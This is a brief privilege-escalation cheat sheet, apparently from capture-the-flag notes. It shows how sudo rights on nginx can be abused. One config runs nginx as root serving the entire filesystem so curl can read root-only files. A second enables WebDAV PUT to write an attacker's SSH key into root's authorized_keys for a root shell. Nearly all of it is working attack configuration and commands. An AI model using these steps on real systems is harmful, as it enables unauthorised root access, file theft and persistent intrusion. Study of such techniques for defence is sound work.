____
# Sudoers

## Create Malicious Webserver

```conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```

```bash
sudo /usr/sbin/nginx -c /dev/shm/test.conf 
```

```bash
curl localhost:1337/root/root.txt
```


### Shell

```conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

```bash
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d kali@kali'
```
